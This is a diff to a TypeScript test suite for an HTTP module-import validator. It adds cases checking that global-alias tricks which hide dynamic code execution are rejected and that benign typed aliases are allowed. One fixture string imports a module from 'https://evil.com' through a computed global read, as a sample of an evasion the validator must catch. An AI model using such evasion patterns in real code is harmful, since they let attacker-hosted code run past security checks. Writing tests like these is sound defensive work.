@@ -472,6 +472,17 @@ describe("routing/api/module-loader/http-validator", () => {
       await assertRejects(
         async () =>
           await validateHTTPImports(
+            `const g = globalThis as typeof globalThis;` +
+              ` const run = g[name]; run(payload);`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a TypeScript assertion around a global alias must not hide computed reads",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
             `const run = self[name]; run('import("https://evil.com/mod.js")');`,
             [],
           ),
@@ -555,6 +566,23 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "dynamic code generation",
         "a destructured reflective getter must not make a computed global read safe",
+      );
+    });
+
+    it("should allow a typed global alias used only for a static cache slot", async () => {
+      await validateHTTPImports(
+        `const g = globalThis as typeof globalThis & { cache?: object };` +
+          ` export const cache = g.cache ??= {};`,
+        [],
+      );
+    });
+
+    it("should allow a computed metadata write without treating the key as a read", async () => {
+      await validateHTTPImports(
+        `const metadata = Symbol.for("veryfront.openapi.metadata");` +
+          ` const handler = () => new Response("ok");` +
+          ` (handler as unknown as Record<symbol, unknown>)[metadata] = {};`,
+        [],
       );
     });
 
